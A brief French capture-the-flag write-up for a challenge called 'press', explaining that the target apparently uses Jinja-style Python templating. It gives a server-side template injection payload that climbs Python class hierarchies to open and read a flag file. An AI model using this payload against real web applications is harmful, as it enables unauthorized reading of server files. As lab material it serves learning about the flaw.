# press

En testant différentes syntaxes, on finit par se rendre compte qu'on a probablement affaire à
du templating jinja ou un autre truc du monde python.

En utilisant le payload suivant, on peut lire le flag:

```
{{ self.__class__.__mro__[1].__subclasses__()[111].__subclasses__()[0].__subclasses__()[0]('/flag/flag').read()}}
```

Source https://payatu.com/blog/understanding-ssti/
